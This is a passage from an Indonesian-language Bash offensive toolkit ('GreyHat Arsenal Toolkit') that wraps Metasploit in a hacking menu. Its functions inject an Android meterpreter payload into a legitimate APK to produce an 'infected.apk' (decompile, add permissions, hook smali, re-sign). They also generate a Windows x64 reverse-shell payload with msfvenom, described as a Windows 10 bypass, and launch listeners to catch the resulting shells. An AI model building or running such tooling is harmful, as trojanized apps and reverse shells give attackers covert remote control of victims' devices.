    animate "Payload Android telah disusupkan ke $original_apk. Hasil disimpan di infected.apk."

    sleep 2

    menu3

}



# Fungsi untuk menyusupkan payload Android ke aplikasi asli new

inject_android_payload_new() {

    clear

    banner

    animate_menu "Susupi Payload Android ke Aplikasi Asli"

    # Meminta input dari pengguna

    animate "Masukkan LHOST untuk payload:"

    prompt

    lhost="$user_input"



    animate "Masukkan LPORT untuk payload:"

    prompt

    lport="$user_input"

    # susupi

    payload_name

    get_payload

    xyz

    gen_payload

    apk_decomp

    apk_decomp1

    perms

    hook_smalies

    apk_comp1

    sign_orig



    sleep 2

    menu3

}



# Fungsi untuk generate payload Windows untuk bypass Windows 10

generate_windows_payload() {

    clear

    banner

    animate_menu "Generate Payload Windows untuk Bypass Windows 10"

    # Meminta input dari pengguna

    animate "Masukkan LHOST untuk payload:"

    prompt

    lhost="$user_input"



    animate "Masukkan LPORT untuk payload:"

    prompt

    lport="$user_input"



    # Menampilkan payload yang akan dibuat

    payload="windows/x64/shell_reverse_tcp"

    animate "Membuat payload Windows untuk bypass Windows 10 dengan LPORT=$lport..."



    # Membuat payload menggunakan msfvenom

    msfvenom -p $payload LHOST=$lhost LPORT=$lport -f python



    animate "Tekan Enter.. Untuk Melanjutkan"

    read x

    sleep 2

    menu3

}



# Fungsi untuk mengaktifkan listener payload Android

activate_android_listener() {

    clear

    banner

    animate_menu "Aktifkan Listener Payload Android"



    # Menampilkan payload yang akan digunakan

    payload="android/meterpreter/reverse_tcp"

    animate "Aktifkan listener payload Android dengan LHOST=$lhost dan LPORT=$lport..."



    # Memulai Metasploit dan mengaktifkan listener

    msfconsole -q -x "use multi/handler; set payload $payload; set LHOST $lhost; set LPORT $lport; exploit"



    animate "Listener payload Android telah diaktifkan."

    sleep 2

    menu3

}



# Fungsi untuk mengaktifkan listener payload Windows

activate_windows_listener() {

    clear

    banner

    animate_menu "Aktifkan Listener Payload Windows"



    # Menampilkan payload yang akan digunakan

    payload="windows/x64/shell_reverse_tcp"

    animate "Aktifkan listener payload Windows dengan LHOST=$lhost dan LPORT=$windows_lport..."



    # Memulai Metasploit dan mengaktifkan listener

    msfconsole -q -x "use multi/handler; set payload $payload; set LHOST $lhost; set LPORT $windows_lport; exploit"



    animate "Listener payload Windows telah diaktifkan."

    sleep 2

    menu3

}









# Fungsi utama untuk menjalankan skrip

run() {

    while true; do

        clear

        banner

        animate "Pilih kategori hacking Anda: "

        animate """

    [1]. Rekognisi

    [2]. Pengujian Aplikasi Web

    [3]. Hacking Android

    [4]. Hacking Wireless

    [5]. Social Engineering

    [6]. Forensik

    [7]. Lain-lain

    [x]. Keluar

    """



        prompt



        case $user_input in

            1) menu1 ;;

            2) menu2 ;;

            3) menu3 ;;

            4) menu4 ;;

            5) menu5 ;;

            6) menu6 ;;

            7) menu7 ;;

            x) break ;;

            *) animate "Pilihan tidak valid. Harap coba lagi." ;;

        esac

    done

}



# Fungsi menu animasi

animate_menu() {

    local title="$1"

    animate "------------------------- $title -------------------------"

    sleep 0.5

}



# Animasi selamat datang

eth0_ip=$(ifconfig eth0 | grep "inet" | awk 'NR == 1 {print $2}')

wlan0_ip=$(ifconfig wlan0 | grep "inet" | awk 'NR == 1 {print $2}')

clear

sleep 1

animate "Selamat datang di GHAT - GreyHat Arsenal Toolkit!"

sleep 1

echo

echo

clear

sleep 1



# Periksa alat

check_tools



# Menambahkan trap untuk menangani Ctrl+C

trap trap_ctrl_c INT



# Jalankan menu utama

run
